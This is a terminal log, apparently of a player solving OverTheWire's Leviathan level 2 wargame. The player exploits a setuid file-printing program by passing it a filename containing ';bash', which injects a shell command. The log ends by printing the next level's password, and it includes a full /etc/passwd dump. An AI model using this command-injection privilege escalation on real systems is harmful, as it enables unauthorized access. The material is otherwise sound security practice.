@@ -1,0 +1,260 @@
+PS C:\Users\c2sha> ssh -p 2223 leviathan2@leviathan.labs.overthewire.org
+                   _            _       _   _
+                  | | _____   _(_) __ _| |_| |__   __ _ _ __
+                  | |/ _ \ \ / / |/ _` | __| '_ \ / _` | '_ \
+                  | |  __/\ V /| | (_| | |_| | | | (_| | | | |
+                  |_|\___| \_/ |_|\__,_|\__|_| |_|\__,_|_| |_|
+
+
+                      This is an OverTheWire game server.
+            More information on http://www.overthewire.org/wargames
+
+leviathan2@leviathan.labs.overthewire.org's password:
+
+      ,----..            ,----,          .---.
+     /   /   \         ,/   .`|         /. ./|
+    /   .     :      ,`   .'  :     .--'.  ' ;
+   .   /   ;.  \   ;    ;     /    /__./ \ : |
+  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
+  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
+  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
+  .   |  ' ' ' : `----'  |  |  \   ;  `      |
+  '   ;  \; /  |     '   :  ;   .   \    .\  ;
+   \   \  ',  /      |   |  '    \   \   ' \ |
+    ;   :    /       '   :  |     :   '  |--"
+     \   \ .'        ;   |.'       \   \ ;
+  www. `---` ver     '---' he       '---" ire.org
+
+
+Welcome to OverTheWire!
+
+If you find any problems, please report them to the #wargames channel on
+discord or IRC.
+
+--[ Playing the games ]--
+
+  This machine might hold several wargames.
+  If you are playing "somegame", then:
+
+    * USERNAMES are somegame0, somegame1, ...
+    * Most LEVELS are stored in /somegame/.
+    * PASSWORDS for each level are stored in /etc/somegame_pass/.
+
+  Write-access to homedirectories is disabled. It is advised to create a
+  working directory with a hard-to-guess name in /tmp/.  You can use the
+  command "mktemp -d" in order to generate a random and hard to guess
+  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc
+  restricted so that users cannot snoop on eachother. Files and directories
+  with easily guessable or short names will be periodically deleted! The /tmp
+  directory is regularly wiped.
+  Please play nice:
+
+    * don't leave orphan processes running
+    * don't leave exploit-files laying around
+    * don't annoy other players
+    * don't post passwords or spoilers
+    * again, DONT POST SPOILERS!
+      This includes writeups of your solution on your blog or website!
+
+--[ Tips ]--
+
+  This machine has a 64bit processor and many security-features enabled
+  by default, although ASLR has been switched off.  The following
+  compiler flags might be interesting:
+
+    -m32                    compile for 32bit
+    -fno-stack-protector    disable ProPolice
+    -Wl,-z,norelro          disable relro
+
+  In addition, the execstack tool can be used to flag the stack as
+  executable on ELF binaries.
+
+  Finally, network-access is limited for most levels by a local
+  firewall.
+
+--[ Tools ]--
+
+ For your convenience we have installed a few useful tools which you can find
+ in the following locations:
+
+    * gef (https://github.com/hugsy/gef) in /opt/gef/
+    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/
+    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/
+    * pwntools (https://github.com/Gallopsled/pwntools)
+    * radare2 (http://www.radare.org/)
+
+--[ More information ]--
+
+  For more information regarding individual wargames, visit
+  http://www.overthewire.org/wargames/
+
+  For support, questions or comments, contact us on discord or IRC.
+
+  Enjoy your stay!
+
+leviathan2@gibson:~$ ls
+printfile
+leviathan2@gibson:~$ ls -la
+total 36
+drwxr-xr-x  2 root       root        4096 Apr 10 14:23 .
+drwxr-xr-x 83 root       root        4096 Apr 10 14:24 ..
+-rw-r--r--  1 root       root         220 Mar 31  2024 .bash_logout
+-rw-r--r--  1 root       root        3771 Mar 31  2024 .bashrc
+-r-sr-x---  1 leviathan3 leviathan2 15072 Apr 10 14:23 printfile
+-rw-r--r--  1 root       root         807 Mar 31  2024 .profile
+leviathan2@gibson:~$ ./printfile
+*** File Printer ***
+Usage: ./printfile filename
+leviathan2@gibson:~$ ltrace ./printfile
+__libc_start_main(0x80490ed, 1, 0xffffd484, 0 <unfinished ...>
+puts("*** File Printer ***"*** File Printer ***
+)                  = 21
+printf("Usage: %s filename\n", "./printfile"Usage: ./printfile filename
+) = 28
++++ exited (status 255) +++
+leviathan2@gibson:~$ ltrace ./printfile /etc/passwd
+__libc_start_main(0x80490ed, 2, 0xffffd464, 0 <unfinished ...>
+access("/etc/passwd", 4)                      = 0
+snprintf("/bin/cat /etc/passwd", 511, "/bin/cat %s", "/etc/passwd") = 20
+geteuid()                                     = 12002
+geteuid()                                     = 12002
+setreuid(12002, 12002)                        = 0
+system("/bin/cat /etc/passwd"root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+systemd-timesync:x:996:996:systemd Time Synchronization:/:/usr/sbin/nologin
+dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
+messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
+syslog:x:102:102::/nonexistent:/usr/sbin/nologin
+systemd-resolve:x:991:991:systemd Resolver:/:/usr/sbin/nologin
+uuidd:x:103:103::/run/uuidd:/usr/sbin/nologin
+tss:x:104:104:TPM software stack,,,:/var/lib/tpm:/bin/false
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+pollinate:x:106:1::/var/cache/pollinate:/bin/false
+tcpdump:x:107:108::/nonexistent:/usr/sbin/nologin
+landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
+fwupd-refresh:x:990:990:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
+polkitd:x:989:989:User for polkitd:/:/usr/sbin/nologin
+ec2-instance-connect:x:109:65534::/nonexistent:/usr/sbin/nologin
+_chrony:x:110:112:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+stunnel4:x:988:988:stunnel service system account:/var/run/stunnel4:/usr/sbin/nologin
+behemoth0:x:13000:13000:behemoth level 0:/home/behemoth0:/bin/bash
+behemoth1:x:13001:13001:behemoth level 1:/home/behemoth1:/bin/bash
+behemoth2:x:13002:13002:behemoth level 2:/home/behemoth2:/bin/bash
+behemoth3:x:13003:13003:behemoth level 3:/home/behemoth3:/bin/bash
+behemoth4:x:13004:13004:behemoth level 4:/home/behemoth4:/bin/bash
+behemoth5:x:13005:13005:behemoth level 5:/home/behemoth5:/bin/bash
+behemoth6:x:13006:13006:behemoth level 6:/home/behemoth6:/bin/bash
+behemoth7:x:13007:13007:behemoth level 7:/home/behemoth7:/bin/bash
+behemoth8:x:13008:13008:behemoth level 8:/home/behemoth8:/bin/bash
+leviathan0:x:12000:12000:leviathan level 0:/home/leviathan0:/bin/bash
+leviathan1:x:12001:12001:leviathan level 1:/home/leviathan1:/bin/bash
+leviathan2:x:12002:12002:leviathan level 2:/home/leviathan2:/bin/bash
+leviathan3:x:12003:12003:leviathan level 3:/home/leviathan3:/bin/bash
+leviathan4:x:12004:12004:leviathan level 4:/home/leviathan4:/bin/bash
+leviathan5:x:12005:12005:leviathan level 5:/home/leviathan5:/bin/bash
+leviathan6:x:12006:12006:leviathan level 6:/home/leviathan6:/bin/bash
+leviathan7:x:12007:12007:leviathan level 7:/home/leviathan7:/bin/bash
+manpage0:x:17000:17000:manpage level 0:/home/manpage0:/bin/bash
+manpage1:x:17001:17001:manpage level 1:/home/manpage1:/bin/bash
+manpage2:x:17002:17002:manpage level 2:/home/manpage2:/bin/bash
+manpage3:x:17003:17003:manpage level 3:/home/manpage3:/bin/bash
+manpage4:x:17004:17004:manpage level 4:/home/manpage4:/bin/bash
+manpage5:x:17005:17005:manpage level 5:/home/manpage5:/bin/bash
+manpage6:x:17006:17006:manpage level 6:/home/manpage6:/bin/bash
+manpage7:x:17007:17007:manpage level 7:/home/manpage7:/bin/bash
+maze0:x:15000:15000:maze level 0:/home/maze0:/bin/bash
+maze1:x:15001:15001:maze level 1:/home/maze1:/bin/bash
+maze2:x:15002:15002:maze level 2:/home/maze2:/bin/bash
+maze3:x:15003:15003:maze level 3:/home/maze3:/bin/bash
+maze4:x:15004:15004:maze level 4:/home/maze4:/bin/bash
+maze5:x:15005:15005:maze level 5:/home/maze5:/bin/bash
+maze6:x:15006:15006:maze level 6:/home/maze6:/bin/bash
+maze7:x:15007:15007:maze level 7:/home/maze7:/bin/bash
+maze8:x:15008:15008:maze level 8:/home/maze8:/bin/bash
+maze9:x:15009:15009:maze level 9:/home/maze9:/bin/bash
+narnia0:x:14000:14000:narnia level 0:/home/narnia0:/bin/bash
+narnia1:x:14001:14001:narnia level 1:/home/narnia1:/bin/bash
+narnia2:x:14002:14002:narnia level 2:/home/narnia2:/bin/bash
+narnia3:x:14003:14003:narnia level 3:/home/narnia3:/bin/bash
+narnia4:x:14004:14004:narnia level 4:/home/narnia4:/bin/bash
+narnia5:x:14005:14005:narnia level 5:/home/narnia5:/bin/bash
+narnia6:x:14006:14006:narnia level 6:/home/narnia6:/bin/bash
+narnia7:x:14007:14007:narnia level 7:/home/narnia7:/bin/bash
+narnia8:x:14008:14008:narnia level 8:/home/narnia8:/bin/bash
+narnia9:x:14009:14009:narnia level 9:/home/narnia9:/bin/bash
+utumno0:x:16000:16000:utumno level 0:/home/utumno0:/bin/bash
+utumno1:x:16001:16001:utumno level 1:/home/utumno1:/bin/bash
+utumno2:x:16002:16002:utumno level 2:/home/utumno2:/bin/bash
+utumno3:x:16003:16003:utumno level 3:/home/utumno3:/bin/bash
+utumno4:x:16004:16004:utumno level 4:/home/utumno4:/bin/bash
+utumno5:x:16005:16005:utumno level 5:/home/utumno5:/bin/bash
+utumno6:x:16006:16006:utumno level 6:/home/utumno6:/bin/bash
+utumno7:x:16007:16007:utumno level 7:/home/utumno7:/bin/bash
+utumno8:x:16008:16008:utumno level 8:/home/utumno8:/bin/bash
+vortex0:x:5000:5000:vortex level 0:/home/vortex0:/bin/bash
+vortex1:x:5001:5001:vortex level 1:/home/vortex1:/bin/bash
+vortex10:x:5010:5010:vortex level 10:/home/vortex10:/bin/bash
+vortex11:x:5011:5011:vortex level 11:/home/vortex11:/bin/bash
+vortex12:x:5012:5012:vortex level 12:/home/vortex12:/bin/bash
+vortex13:x:5013:5013:vortex level 13:/home/vortex13:/bin/bash
+vortex14:x:5014:5014:vortex level 14:/home/vortex14:/bin/bash
+vortex15:x:5015:5015:vortex level 15:/home/vortex15:/bin/bash
+vortex16:x:5016:5016:vortex level 16:/home/vortex16:/bin/bash
+vortex17:x:5017:5017:vortex level 17:/home/vortex17:/bin/bash
+vortex18:x:5018:5018:vortex level 18:/home/vortex18:/bin/bash
+vortex19:x:5019:5019:vortex level 19:/home/vortex19:/bin/bash
+vortex2:x:5002:5002:vortex level 2:/home/vortex2:/bin/bash
+vortex20:x:5020:5020:vortex level 20:/home/vortex20:/bin/bash
+vortex21:x:5021:5021:vortex level 21:/home/vortex21:/bin/bash
+vortex22:x:5022:5022:vortex level 22:/home/vortex22:/bin/bash
+vortex23:x:5023:5023:vortex level 23:/home/vortex23:/bin/bash
+vortex24:x:5024:5024:vortex level 24:/home/vortex24:/bin/bash
+vortex25:x:5025:5025:vortex level 25:/home/vortex25:/bin/bash
+vortex3:x:5003:5003:vortex level 3:/home/vortex3:/bin/bash
+vortex4:x:5004:5004:vortex level 4:/home/vortex4:/bin/bash
+vortex5:x:5005:5005:vortex level 5:/home/vortex5:/bin/bash
+vortex6:x:5006:5006:vortex level 6:/home/vortex6:/bin/bash
+vortex7:x:5007:5007:vortex level 7:/home/vortex7:/bin/bash
+vortex8:x:5008:5008:vortex level 8:/home/vortex8:/bin/bash
+vortex9:x:5009:5009:vortex level 9:/home/vortex9:/bin/bash
+ <no return ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                        = 0
++++ exited (status 0) +++
+leviathan2@gibson:~$ mktemp -d
+/tmp/tmp.uY8K12BbMD
+leviathan2@gibson:~$ cd /tmp/tmp.uY8K12BbMD
+leviathan2@gibson:/tmp/tmp.uY8K12BbMD$ touch 'file;bash'
+leviathan2@gibson:/tmp/tmp.uY8K12BbMD$ ls
+file;bash
+leviathan2@gibson:/tmp/tmp.uY8K12BbMD$ .printfile /tmp/tmp.uY8K12BbMD/file\;bash
+.printfile: command not found
+leviathan2@gibson:/tmp/tmp.uY8K12BbMD$ ./printfile /tmp/tmp.uY8K12BbMD/file\
+;bash
+-bash: ./printfile: No such file or directory
+leviathan2@gibson:/tmp/tmp.uY8K12BbMD$ cd
+leviathan2@gibson:~$ ./printfile /tmp/tmp.uY8K12BbMD/file\;bash
+/bin/cat: /tmp/tmp.uY8K12BbMD/file: Permission denied
+leviathan3@gibson:~$ cat /etc/leviathan_pass/leviathan3
+f0n8h2iWLP
+timed out waiting for input: auto-logout
+timed out waiting for input: auto-logout
+Connection to leviathan.labs.overthewire.org closed.
